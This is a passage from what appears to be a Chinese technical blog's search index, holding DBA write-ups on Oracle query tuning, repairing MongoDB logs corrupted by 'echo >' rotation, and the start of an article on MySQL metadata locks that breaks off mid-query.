BY ifcl.EMP_PK, ifcl.COMPARE_DATE, ifcl.STATUS HAVING AVG( STATUS )&lt; 1 ) ifcl1, ( SELECT * FROM ( SELECT EMP_PK, COMPARE_DATE, COMPARE_TYPE, ROW_NUMBER() OVER( PARTITION BY EMP_PK, COMPARE_DATE ORDER BY CREATED DESC ) rn FROM IPG_FACE_COMPARE_LOG WHERE COMPARE_DATE &gt;= TO_CHAR( TO_DATE(&apos;2018-04-01&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) AND COMPARE_DATE &lt;= TO_CHAR( TO_DATE(&apos;2018-04-30&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) AND COMPARE_TYPE IN( &apos;1&apos;, &apos;3&apos;, &apos;5&apos; ) ) t WHERE t.rn &lt;= 1 ) ifcl1Staus, ( SELECT SP_LEV_RPT.ATT_SCH_PK, COUNT(*) AS LEAVECount FROM SP_LEV_RPT WHERE SP_LEV_RPT.START_TIME IS NOT NULL GROUP BY SP_LEV_RPT.ATT_SCH_PK ) levLeave, ( SELECT SP_LEV_RPT.ATT_SCH_PK, COUNT(*) AS RETURNCount FROM SP_LEV_RPT WHERE SP_LEV_RPT.END_TIME IS NOT NULL GROUP BY SP_LEV_RPT.ATT_SCH_PK ) levRtn, ( SELECT WX_QUESTION.PRJ_ID, DM_PROJECT.CODE, &apos;Y&apos; AS STATUS FROM WX_QUESTION, DM_PROJECT WHERE DM_PROJECT.ID = WX_QUESTION.PRJ_ID AND WX_QUESTION.IS_DEL = &apos;0&apos; AND WX_QUESTION.STATUS = &apos;0&apos; GROUP BY WX_QUESTION.PRJ_ID, DM_PROJECT.CODE ) wq, ( SELECT ifcl.EMP_PK, ifcl.COMPARE_DATE, COUNT(*) AS faceCount FROM IPG_FACE_COMPARE_LOG ifcl WHERE ifcl.HANDLE_TYPE = 0 AND ifcl.COMPARE_TYPE IN( &apos;1&apos;, &apos;3&apos;, &apos;5&apos; ) AND ifcl.COMPARE_DATE &gt;= TO_CHAR( TO_DATE(&apos;2018-04-01&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) AND ifcl.COMPARE_DATE &lt;= TO_CHAR( TO_DATE(&apos;2018-04-30&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) GROUP BY ifcl.EMP_PK, ifcl.COMPARE_DATE ) ifaceCount, ( SELECT iface.EMP_PK, iface.COMPARE_DATE, wm_concat( ( SELECT NVL( TRIM( T.PAR_VALUE ), TRIM( T.OLD_PAR_VALUE )) FROM ( SELECT ( SELECT PAR_VALUE FROM MD_SYS_PARM WHERE PAR_CODE = &apos;OLD_PIC_PATH&apos; ) AS OLD_PAR_VALUE, PAR_VALUE FROM MD_SYS_PARM WHERE PAR_CODE = &apos;ATT_COS_PATH&apos; ) T )|| REPLACE( SUBSTR( iface.COMPARE_MSG, INSTR( iface.COMPARE_MSG, &apos;compare&apos;, 1, 1 )), &apos;]&apos;, &apos;&apos; ) ) AS FACE_ATT_IMG FROM ( SELECT ifa.EMP_PK, ifa.COMPARE_DATE, ifa.COMPARE_MSG, RANK() OVER( PARTITION BY ifa.EMP_PK, ifa.COMPARE_DATE ORDER BY ifa.created DESC ) rankno FROM IPG_FACE_COMPARE_LOG ifa WHERE ifa.HANDLE_TYPE = 0 AND ifa.COMPARE_TYPE IN( &apos;1&apos;, &apos;3&apos;, &apos;5&apos; ) AND INSTR( ifa.COMPARE_MSG, &apos;compare&apos; )&gt; 0 AND ifa.COMPARE_DATE &gt;= TO_CHAR( TO_DATE(&apos;2018-04-01&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) AND ifa.COMPARE_DATE &lt;= TO_CHAR( TO_DATE(&apos;2018-04-30&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) ) iface WHERE iface.rankno &lt;= 3 GROUP BY iface.EMP_PK, iface.COMPARE_DATE ) iface2WHERE prj.PRJ_NAME =&apos;(2013)行政项目&apos; AND prj.ATT_DATE &gt;=&apos;2018-04-01&apos; AND prj.ATT_DATE &lt;=&apos;2018-04-30&apos; AND prj.EMP_PK = ifcl1.EMP_PK(+) AND TO_CHAR( TO_DATE( prj.ATT_DATE, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; )= ifcl1.COMPARE_DATE(+) AND prj.EMP_PK = ifcl1Staus.EMP_PK(+) AND TO_CHAR( TO_DATE( prj.ATT_DATE, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; )= ifcl1Staus.COMPARE_DATE(+) AND prj.ATT_SCH_PK = levLeave.ATT_SCH_PK(+) AND prj.ATT_SCH_PK = levRtn.ATT_SCH_PK(+) AND prj.PRJ_CODE = wq.CODE(+) AND prj.EMP_PK = ifaceCount.EMP_PK(+) AND TO_CHAR( TO_DATE( prj.ATT_DATE, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; )= ifaceCount.COMPARE_DATE(+) AND prj.EMP_PK = iface2.EMP_PK(+) AND TO_CHAR( TO_DATE( prj.sc_schedule_date, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; )= iface2.COMPARE_DATE(+)ORDER BY APPLY_DATE DESC, ATTTYPE DESC SQL优化思路SQL语句较复杂，8个子查询的left outer join，每个子查询中又有连接。思路如下： 从外往内拆分子查询 老旧对比子查询执行计划和执行效率 子查询连接从1到2到3一直到8个联查对比，寻找瓶颈 拆分子查询 子查询 老库 （秒） 新库（秒） prj 1.182 0.318 ifcl1 14.229 13.168 ifclStatus 15.739 16.769 levLeave 10.147 9.813 levRtn 9.148 8.3 wq 0.141 0.165 ifcl1Count 3.498 1.966 iface2 49.255 50.897 寻找瓶颈 连接 老库（秒） 新库（秒） prj+ifcl1 1.522 1.129 +ifclStatus 2.343 1.957 +levLeave 2.525 1.955 +levRtn 2.658 1.653 +wq 2.561 1.999 +ifcl1Count 3.498 1.966 +iface2 11.124 383 发现瓶颈出现在iface2 优化iface21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556SELECT iface.EMP_PK, iface.COMPARE_DATE, wm_concat( ( SELECT NVL( TRIM( T.PAR_VALUE ), TRIM( T.OLD_PAR_VALUE )) FROM ( SELECT ( SELECT PAR_VALUE FROM MD_SYS_PARM WHERE PAR_CODE = &apos;OLD_PIC_PATH&apos; ) AS OLD_PAR_VALUE, PAR_VALUE FROM MD_SYS_PARM WHERE PAR_CODE = &apos;ATT_COS_PATH&apos; ) T )|| REPLACE( SUBSTR( iface.COMPARE_MSG, INSTR( iface.COMPARE_MSG, &apos;compare&apos;, 1, 1 )), &apos;]&apos;, &apos;&apos; ) ) AS FACE_ATT_IMG FROM ( SELECT ifa.EMP_PK, ifa.COMPARE_DATE, ifa.COMPARE_MSG, RANK() OVER( PARTITION BY ifa.EMP_PK, ifa.COMPARE_DATE ORDER BY ifa.created DESC ) rankno FROM IPG_FACE_COMPARE_LOG ifa WHERE ifa.HANDLE_TYPE = 0 AND ifa.COMPARE_TYPE IN( &apos;1&apos;, &apos;3&apos;, &apos;5&apos; ) AND INSTR( ifa.COMPARE_MSG, &apos;compare&apos; )&gt; 0 AND ifa.COMPARE_DATE &gt;= TO_CHAR( TO_DATE(&apos;2018-04-01&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) AND ifa.COMPARE_DATE &lt;= TO_CHAR( TO_DATE(&apos;2018-04-30&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) ) iface WHERE iface.rankno &lt;= 3 GROUP BY iface.EMP_PK, iface.COMPARE_DATE IPG_FACE_COMPARE_LOG表中COMPARE_DATE列需要新增索引。 总结 oracle小版本不同引起优化器无法获取相同的执行计划 索引缺失是本次的慢查询的主要原因","link":"/2018/05/29/booboo_others/2018-05-28-tec-oracle/"},{"title":"利用split工具解决一次MongoDB日志异常问题","text":"摘要： 某天晚上刚到家不久，就接到杭州同事的电话，客户MongoDB集群中的某个分片节点CPU飙高，初步判断是慢查询，现在需要拉取CPU飙高时间段的慢查询。心想拉取慢查询应该很快，不就是个系统日志吗？而且还做了日志切割一天一个，按道理很快搞定的，谁知当天晚上搞了接近三个小时也没搞定。究竟发生了什么？ 进入到日志目录一看，目前保留近7天的日志，每天的日志量在23G~24G，我当时就想这个客户数据量这么大！后续发现日志格式本该为普通文本文件确变成了图片格式，究竟为何会文件格式会转变？能否从图片格式中拉取指定时间段的日志呢？ 第二天到公司，由于客户环境我们也是第一次接手，因此咱们技术专家团队搞了一个3人的”专家会诊”，经过了一番折腾总算把原因找到了，具体过程请看下文！ 故事背景数据库明细说在前面： 数据库：MongoDB集群 4个分片节点 分片节点规格：16核 / 32G CentOS 7.4 64位 数据目录所在磁盘: 300G 49G 252G 17% /data 故事情节 某天晚上刚到家不久，就接到杭州同事的电话，客户MongoDB集群中的某个分片节点CPU飙高，初步判断是慢查询，现在需要拉取CPU飙高时间段的慢查询。心想拉取慢查询应该很快，不就是个系统日志吗？而且还做了日志切割一天一个，按道理很快搞定的，谁知当天晚上搞了接近三个小时也没搞定。究竟发生了什么？ 进入到日志目录一看，目前保留近7天的日志，每天的日志量在23G~24G，我当时就想这个客户数据量这么大！后续发现日志格式本该为普通文本文件确变成了图片格式，究竟为何会文件格式会转变？能否从图片格式中拉取指定时间段的日志呢？ 第二天到公司，由于客户环境我们也是第一次接受，因此咱们技术专家团队搞了一个3人的”专家会诊”，经过了一番折腾总算把原因找到了，具体过程请看下文！ 复现与剖析拉取日志异常使用mlogfilter过滤文件时报错说文件非mongodb的日志文件 12[root@sh_01 booboo]# mlogfilter shard.log.2018-08-01 --from 2018-08-01T15:00:00.000+0800 --to &quot;+1h&quot; --slow 1000 &gt; /alidata/booboo/tf.1报错:非mongodb日志格式 回到客户服务器检查日志文件格式，明细如下： 12345678910[root@MONGO-SHARD-18 logs]# file *shard.log: PCX ver. 2.5 image datashard.log.2018-07-25: PCX ver. 2.5 image datashard.log.2018-07-26: PCX ver. 2.5 image datashard.log.2018-07-27: PCX ver. 2.5 image datashard.log.2018-07-28: PCX ver. 2.5 image datashard.log.2018-07-29: PCX ver. 2.5 image datashard.log.2018-07-30: PCX ver. 2.5 image datashard.log.2018-07-31: PCX ver. 2.5 image datashard.log.2018-08-01: PCX ver. 2.5 image data mongodb的日志正常应该为：ASCII text, with very long lines，但是现在却变成了PCX ver. 2.5 image data。需要弄清楚原因。 日志异常分析 为什么客户每天的日志量达到22个G，并且每天的日志量都是大于等于前一天？很显然，日志截断有问题。 这个是近7天的日志，而日志格式变成了PCX图片格式是为何？ 怀疑每次日志轮询时都没有真正截断日志！ 分析原日志切割明细 怀疑与echo &gt;有关，进行验证。 验证echo &gt;与PCX图片头部0a一致 建一个空文档log；执行echo &gt; log；通过cat -A log查看文件中插入了一个符号即换行符\\n 通过hexdump -c log 查看测试文件头部显示为ASCII字符 \\n 通过hexdump -d log 查看测试文件头部显示为16进制00010 即0a 通过vim 用16进制查看文档log可以看到log的文件头部为0a，正是PCX图片的头部 生产环境查看客户有问题的mongodb系统日志文件格式为PCX图片格式 通过hexdump -c log 显示为ASCII字符，生产日志文件头部与测试的log一致，都是\\n 通过hexdump -d log显示为16进制，生产日志文件头部与测试的log一致00010 即 0a 到此验证成功:通过echo &gt; log的方式会往文件头部新增’0a’ 复现MongoDB日志从ASCII text转变为PCX 格式在测试环境中复现日志从ASCII text变成PCX ver. 2.5 image data 通过mongo登陆数据库执行大量的插入操作 通过echo &gt; mongod27017.log 命令尝试清空mongod27017.log 查看截断后的日志文件格式，变成了very short file (no magic) 等文档插入完毕 通过tail -f 查看日志明细，看到确实有日志写入 查看日志格式，发现变成了PCX ver. 2.5 image data 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192[root@sh_01 ~]# mongoMongoDB shell version: 3.2.16connecting to: test&gt; db.auth(&apos;test_dev&apos;,&apos;uplooking&apos;)1&gt; db.t1.find(){ &quot;_id&quot; : ObjectId(&quot;5b5ebb6796b8b74a73ee30f6&quot;), &quot;a&quot; : 1, &quot;b&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;5b5ebb6996b8b74a73ee30f7&quot;), &quot;a&quot; : 1, &quot;b&quot; : 1 }&gt; for (i=1;i&lt;200000;i++){... db.t1.insert({id:i})}WriteResult({ &quot;nInserted&quot; : 1 })[root@sh_01 ~]# cd /alidata/mongodb/logs[root@sh_01 log]# ll-rw-r--r-- 1 root root 2182 Aug 3 10:28 mongod27017.log-rw-r--r-- 1 root root 3100 Aug 2 14:19 mongod27017.log.2018-08-02T07-18-27-rw-r--r-- 1 root root 1526 Aug 2 15:18 mongod27017.log.2018-08-02T07-18-54[root@sh_01 log]# file *mongod27017.log: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-27: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines[root@sh_01 log]# echo &gt; mongod27017.log[root@sh_01 log]# echo &gt; mongod27017.log[root@sh_01 log]# lltotal 12-rw-r--r-- 1 root root 1 Aug 3 10:29 mongod27017.log-rw-r--r-- 1 root root 3100 Aug 2 14:19 mongod27017.log.2018-08-02T07-18-27-rw-r--r-- 1 root root 1526 Aug 2 15:18 mongod27017.log.2018-08-02T07-18-54[root@sh_01 log]# file *mongod27017.log: very short file (no magic)mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines[root@sh_01 log]# tail -f mongod27017.log2018-08-03T10:30:21.936+0800 I NETWORK [initandlisten] connection accepted from 127.0.0.1:43720 #2 (2 connections now open)[root@sh_01 log]# ll -htotal 12K-rw-r--r-- 1 root root 2.8K Aug 3 10:30 mongod27017.log-rw-r--r-- 1 root root 3.1K Aug 2 14:19 mongod27017.log.2018-08-02T07-18-27-rw-r--r-- 1 root root 1.5K Aug 2 15:18 mongod27017.log.2018-08-02T07-18-54[root@sh_01 log]# file *mongod27017.log: PCX ver. 2.5 image datamongod27017.log.2018-08-02T07-18-27: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines# 一边不断产生日志，一边多次执行echo&gt; [root@sh_01 log]# echo &gt; mongod27017.log[root@sh_01 log]# echo &gt; mongod27017.log[root@sh_01 log]# file *mongod27017.log: PCX ver. 2.5 image datamongod27017.log.2018-08-02T07-18-27: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-54: ASCII text, with very long linesmongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data[root@sh_01 log]# echo &gt; mongod27017.log[root@sh_01 log]# file *mongod27017.log: very short file (no magic)mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-54: ASCII text, with very long linesmongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data[root@sh_01 log]# ll -htotal 16K-rw-r--r-- 1 root root 1 Aug 3 11:28 mongod27017.log-rw-r--r-- 1 root root 3.1K Aug 2 14:19 mongod27017.log.2018-08-02T07-18-27-rw-r--r-- 1 root root 1.5K Aug 2 15:18 mongod27017.log.2018-08-02T07-18-54-rw-r--r-- 1 root root 2.9K Aug 3 11:05 mongod27017.log.2018-08-03T03-09-08[root@sh_01 log]# file *mongod27017.log: very short file (no magic)mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-54: ASCII text, with very long linesmongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data[root@sh_01 log]# file *mongod27017.log: PCX ver. 2.5 image datamongod27017.log.2018-08-02T07-18-27: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-54: ASCII text, with very long linesmongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data[root@sh_01 log]# hexdump -c mongod27017.log0000000 \\n \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\00000010 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0*0000850 \\0 \\0 \\0 \\0 \\0 \\0 \\0 2 0 1 8 - 0 8 - 00000860 3 T 1 1 : 2 9 : 0 6 . 7 2 9 + 00000870 8 0 0 I A C C E S S [0000880 c o n n 3 ] U n a u t h o r i0000890 z e d : n o t a u t h o r i00008a0 z e d o n t e s t t o e00008b0 x e c u t e c o m m a n d {00008c0 f i n d : &quot; t 1 &quot; , f i l00008d0 t e r : { } } \\n 成功复现了客户的情况： 第一次echo &gt; log，文件头部新增\\n 多次echo &gt; log,文件头部如下： 1230000000 \\n \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\00000010 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0* 确实是mongodb日志轮询出了问题： echo &gt; log会往文件头部插入\\n即16进制的0a 在数据库正常运行中，对log文件是加了锁的，强制执行echo &gt; log是无法进行覆盖的，会将所有的数据全部置为0 强制覆盖后，文件头部变成了无数的空白 待解决问题 MongoDB日志轮询方法调整为kill -SIGUSER1 [mongodpid] 修复目前已经变为图片格式的日志，并拉取15点到16点的日志 解决方法MongoDB日志轮询测试环境12345678910111213141516[root@sh_01 log]# pidof mongod1828[root@sh_01 log]# kill -SIGUSER1 1828-bash: kill: SIGUSER1: invalid signal specification[root@sh_01 log]# kill -SIGUSR1 1828[root@sh_01 log]# lltotal 16-rw-r--r-- 1 root root 1526 Aug 3 11:09 mongod27017.log-rw-r--r-- 1 root root 3100 Aug 2 14:19 mongod27017.log.2018-08-02T07-18-27-rw-r--r-- 1 root root 1526 Aug 2 15:18 mongod27017.log.2018-08-02T07-18-54-rw-r--r-- 1 root root 2942 Aug 3 11:05 mongod27017.log.2018-08-03T03-09-08[root@sh_01 log]# file *mongod27017.log: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-27: ASCII text, with very long linesmongod27017.log.2018-08-02T07-18-54: ASCII text, with very long linesmongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data 生产环境 修改日志轮询脚本： 12345678910111213141516171819[root@MONGO-SHARD-18 logs]# cat /etc/init.d/mongo_logspit.sh #!/bin/bash# 2018/08/02 Apple#Rotate the MongoDB logs to prevent a single logfile from consuming too much disk space.cmd=mongodmongodpath=/opt/mongodb/binpidarray=`pidof ${mongodpath}/$cmd`LOGPATH_SHARD=/data/mongodb/shard1/logsfor pid in $pidarray;doif [ $pid ]then kill -SIGUSR1 $pidfidone#clear logfile more than 7 dayscd $LOGPATH_SHARDfind ./ -xdev -mtime +7 -name &quot;shard.log.*&quot; -exec rm -f {} \\; 所有的分片都去执行： 1kill -SIGUSR1 pidof mongod 分片15操作如下：其他分片同样 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[zyadmin@MONGO-SHARD-15 ~]$ sudo -i[root@MONGO-SHARD-15 ~]# cd /data/mongodb/shard1/logs/[root@MONGO-SHARD-15 logs]# ll -htotal 1.7G-rw-r--r-- 1 root root 20G Aug 2 15:27 shard.log-rw-r--r-- 1 root root 19G Jul 25 23:50 shard.log.2018-07-25-rw-r--r-- 1 root root 19G Jul 26 23:50 shard.log.2018-07-26-rw-r--r-- 1 root root 19G Jul 27 23:50 shard.log.2018-07-27-rw-r--r-- 1 root root 20G Jul 28 23:50 shard.log.2018-07-28-rw-r--r-- 1 root root 20G Jul 29 23:50 shard.log.2018-07-29-rw-r--r-- 1 root root 20G Jul 30 23:50 shard.log.2018-07-30-rw-r--r-- 1 root root 20G Jul 31 23:50 shard.log.2018-07-31-rw-r--r-- 1 root root 20G Aug 1 23:50 shard.log.2018-08-01[root@MONGO-SHARD-15 logs]# file *shard.log: PCX ver. 2.5 image datashard.log.2018-07-25: PCX ver. 2.5 image datashard.log.2018-07-26: PCX ver. 2.5 image datashard.log.2018-07-27: PCX ver. 2.5 image datashard.log.2018-07-28: PCX ver. 2.5 image datashard.log.2018-07-29: PCX ver. 2.5 image datashard.log.2018-07-30: PCX ver. 2.5 image datashard.log.2018-07-31: PCX ver. 2.5 image datashard.log.2018-08-01: PCX ver. 2.5 image data[root@MONGO-SHARD-15 logs]# kill -SIGUSR1 `pidof mongod`[root@MONGO-SHARD-15 logs]# file *shard.log: ASCII text, with very long linesshard.log.2018-07-25: PCX ver. 2.5 image datashard.log.2018-07-26: PCX ver. 2.5 image datashard.log.2018-07-27: PCX ver. 2.5 image datashard.log.2018-07-28: PCX ver. 2.5 image datashard.log.2018-07-29: PCX ver. 2.5 image datashard.log.2018-07-30: PCX ver. 2.5 image datashard.log.2018-07-31: PCX ver. 2.5 image datashard.log.2018-08-01: PCX ver. 2.5 image datashard.log.2018-08-02T07-27-29: PCX ver. 2.5 image data[root@MONGO-SHARD-15 logs]# ll -htotal 1.7G-rw-r--r-- 1 root root 2.0K Aug 2 15:27 shard.log-rw-r--r-- 1 root root 19G Jul 25 23:50 shard.log.2018-07-25-rw-r--r-- 1 root root 19G Jul 26 23:50 shard.log.2018-07-26-rw-r--r-- 1 root root 19G Jul 27 23:50 shard.log.2018-07-27-rw-r--r-- 1 root root 20G Jul 28 23:50 shard.log.2018-07-28-rw-r--r-- 1 root root 20G Jul 29 23:50 shard.log.2018-07-29-rw-r--r-- 1 root root 20G Jul 30 23:50 shard.log.2018-07-30-rw-r--r-- 1 root root 20G Jul 31 23:50 shard.log.2018-07-31-rw-r--r-- 1 root root 20G Aug 1 23:50 shard.log.2018-08-01-rw-r--r-- 1 root root 20G Aug 2 15:27 shard.log.2018-08-02T07-27-29 修复异常日志修复思路弄清楚日志变更的原因以及复现过程后，不难发现，日志因为头部变化从而导致文件格式变更。因此推测异常日志的组成如下： 头部为0a 中间全部都是0 最后是正常的字符串记录着mongodb的日志信息，类似于2018-08-03T10:30:21.936+0800 I NETWORK [initandlisten] connection accepted from 127.0.0.1:43720 #2 (2 connections now open)由日志和日志明细组成 因此修复的思路如下： 23G的日志，首先按照大小6G做切分split -b 6G log，切分成4个文件 查看切分后的日志格式，如果最后一个日志为ASCII text则不再切分否则，将最后一个日志继续切分 循环上一步，直到最后一个文件切分出来没有ASCII text为止 操作明细 日志轮询的部署距离现在大概4个月 第一次将23G的文件以6G切分成4个文件：xaa\\xab\\xac\\xad，查看4个文件的属性为1234xaa: PCX ver. 2.5 image dataxab: PCX ver. 2.5 image dataxac: PCX ver. 2.5 image dataxad: PCX ver. 2.5 image data 重命名xad为x1第二次切分x1 5G，按照1G切分成5份，查看文件属性12345xaa: PCX ver. 2.5 image dataxab: PCX ver. 2.5 image dataxac: PCX ver. 2.5 image dataxad: PCX ver. 2.5 image dataxae: ASCII text, with very long lines 重名xad 为 x2 按照15M的大小切分，查看文件的属性如下12345678910111213xaa: PCX ver. 2.5 image data此处省略。。。xdo: PCX ver. 2.5 image dataxdp: ASCII text, with very long linesxdq: ASCII text, with very long linesxdr: ASCII text, with very long linesxds: ASCII text, with very long linesxdt: ASCII text, with very long linesxdu: ASCII text, with very long linesxdv: UTF-8 Unicode text, with very long linesxdw: ASCII text, with very long linesxdx: ASCII text, with very long linesxdy: ASCII text, with very long lines 切分后文件类型为ASCII text的文件中找到15点~16点的文档123456[root@sh_01 mongolog_20180801]# head -n 2 xdvre: &quot;x86_64&quot;, version: &quot;Kernel 3.10.0-693.2.2.el7.x86_64&quot; } }2018-08-01T16:13:44.958+0800 I ACCESS [conn4972925] Successfully authenticated as principal __system on local[root@sh_01 mongolog_20180801]# head -n 2 xdu38422 #4967772 (445 connections now open)2018-08-01T14:00:10.575+0800 I NETWORK [thread1] connection accepted from 172.16.0.44:38430 #4967773 (446 connections now open) xdv 的头部是2018-08-01T16:13:44.958+0800,因此可以确定15~16的日志在xdu中 xdu记录的日志时间段为2018-08-01T14:00:10.575+0800~2018-08-01T16:13:44.958+0800 重命名xdu为mongolog.18.14_16 分析日志分析命令12345678# 获取08月01号下午3点开始到4点执行时间超过5秒的查询mlogfilter mongolog.18.14_16 --from 2018-08-01T15 --to &quot;+1h&quot; --slow 5000 &gt; slowlog.txt# 获取08月01号下午3点开始到4点语句的执行次数、用时等统计信息mloginfo slowlog.txt --queries &gt; an_slowlog.txt# 通过mplotqueries进行慢查询散点分布图绘制，且只返回前10个mplotqueries slowlog.txt --output-file 01.png --logscale --group-limit 10 慢查询散点分布图12345678[root@sh_01 booboo]# mplotqueries slowlog.txt --output-file 01.png --logscale --group-limit 10 SCATTER plot id #points group 1 692 order.order 2 615 omdmain.item_region_erp 3 1 omdmain.customer() 总结mongodb日志轮询的问题 echo &gt; log会往文件头部插入\\n即16进制的0a 在数据库正常运行中，对log文件是加了锁的，强制执行echo &gt; log是无法进行覆盖的，会将所有的数据全部置为0 强制覆盖后，文件头部变成了无数的空白 问题解决 MongoDB日志轮询方法调整为kill -SIGUSER1 [mongodpid] 修复目前已经变为图片格式的日志，并拉取15点到16点的日志 该case花了一整天，从怀疑被攻击到确认是日志轮询引起文件格式变更是一个关键转折点； 另外PCX格式是第一次碰到，疑惑了半天~最后是@培尧发现了echo的端倪，@衾袭@大宝去验证最终确认了问题的根源。","link":"/2018/08/03/booboo_others/2018-08-03-tec-mongodb/"},{"title":"MySQL的元锁MDL发生场景和解决方法总结","text":"摘要：MetaData Lock即元数据锁，在数据库中元数据即数据字典信息包括db,table,function,procedure,trigger,event等。metadata lock主要为了保证元数据的一致性,用于处理不同线程操作同一数据对象的同步与互斥问题。 今天有客户(MySQL 5.6)遇到该问题，最关键的是属于第三种情况，google上根本找不到类似的故障案例，唯一一个非常接近的故障案例中数据库版本却不同（具体看下文慢慢聊），哎，困难重重啊，最终还是解决了哈。 alter table的语句是很危险的，在操作之前最好确认对要操作的表没有任何进行中的操作、没有未提交事务、也没有显式事务中的报错语句。如果有alter table的维护任务，在无人监管的时候运行，最好通过lock_wait_timeout设置好超时时间，避免长时间的metedata锁等待。 什么是metadata lock？MetaData Lock即元数据锁，在数据库中元数据即数据字典信息包括db,table,function,procedure,trigger,event等。metadata lock主要为了保证元数据的一致性,用于处理不同线程操作同一数据对象的同步与互斥问题。 MetaData Lock的前世今生MDL锁是为了解决一个有名的bug#989，所以在5.5.3版本引入了MDL锁。其实5.5也有类似保护元数据的机制，只是没有明确提出MDL概念而已。但是5.5之前版本(比如5.1)与5.5之后版本在保护元数据这块有一个显著的不同点是，5.1对于元数据的保护是语句级别的，5.5对于metadata的保护是事务级别的。所谓语句级别，即语句执行完成后，无论事务是否提交或回滚，其表结构可以被其他会话更新；而事务级别则是在事务结束后才释放MDL。引入MDL锁主要是为了解决两个问题： 事务隔离问题：比如在可重复隔离级别下，会话A在2次查询期间，会话B对表结构做了修改，两次查询结果就会不一致，无法满足可重复读的要求。 数据复制问题：比如会话A执行了多条更新语句期间，另外一个会话B做了表结构变更并且先提交，就会导致slave在重做时，先重做alter，再重做update时就会出现复制错误的现象。也就是上面提到的bug#989。 DDL操作与MetaData Lock metadata lock 机制是为了保证数据一致性存在的，在有事务的操作时候，需要首先获得metadata lock ,然后操作，如果这个时候，又来了一个事务也要ddl操作同一个表，就会出现 metadata lock。 自动提交模式下，单语句就是一个事务，执行完了，事务也就结束了。 preparestatement 会获得 metalock，一旦prepare 完毕， metalock 就释放了。 online DDL应该是指在alter table进行的时候， 插入/修改/删除数据的sql语句不会Waiting for table metadata lock。一旦alter table TableA的操作停滞在Waiting for table metadata lock的状态，后续对TableA的任何操作（包括读）都无法进行，也会在Opening tables的阶段进入Waiting for table metadata lock的队列。 Alter table 会发生锁的三种场景场景1 会话A对booboo表执行读操作select *,sleep(60) from booboo;，正在进行未提交事务 会话B对booboo表执行在线DDL操作alter table booboo add q4 int default 0; 会话C对booboo表执行隐式读操作select *,sleep(60) from booboo;,进行等待 会话D对booboo表执行显示读操作begin;select * from booboo;也会进行等待 通过show processlist可以看到会话A（对booboo表上正在进行的操作），此时会话B（alter table语句）无法获取到metadata 独占锁，会进行等待，会话C和会话D都会进行等待，且能从processlist表中看到对booboo表的操作 会话A提交事务后或kill之后，会话C事务结束，会话Dselect语句执行成功，事务提交则会话B可执行，否则进入场景2 123456789101112131415mysql&gt; show processlist;+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+| Id | User | Host | db | Command | Time | State | Info |+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+| 6 | root | localhost | uplooking | Query | 167 | Waiting for table metadata lock | alter table booboo add q4 int default 0 || 7 | root | localhost | uplooking | Query | 155 | Waiting for table metadata lock | select * from booboo || 8 | root | localhost | uplooking | Query | 0 | starting | show processlist || 9 | root | localhost | uplooking | Query | 181 | User sleep | select *,sleep(60) from booboo || 10 | root | localhost | uplooking | Query | 7 | Waiting for table metadata lock | select * from booboo |+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+5 rows in set (0.00 sec)# id=9的线程为会话A 虽然是隐式事务，但是没有执行成功，所以为未提交的事务# id=6的线程为会话B 在会话A有事务未提交的情况下，执行Alter操作,争抢metadata lock# id=7的线程为会话C 隐式查询事务也会进入等待# id=10的线程为会话D 显示查询事务同样进入等待 解决方法 123456789101112131415161718192021# 查看metadatalock## 第一种情况，则定位到长时间未提交的事务kill即可# 查询 information_schema.innodb_trx 看到有长时间未完成的事务， 使用 kill 命令终止该查询。select concat(&apos;kill &apos;,i.trx_mysql_thread_id,&apos;;&apos;) from information_schema.innodb_trx i, (select id, time from information_schema.processlist where time = (select max(time) from information_schema.processlist where state = &apos;Waiting for table metadata lock&apos; and substring(info, 1, 5) in (&apos;alter&apos; , &apos;optim&apos;, &apos;repai&apos;, &apos;lock &apos;, &apos;drop &apos;, 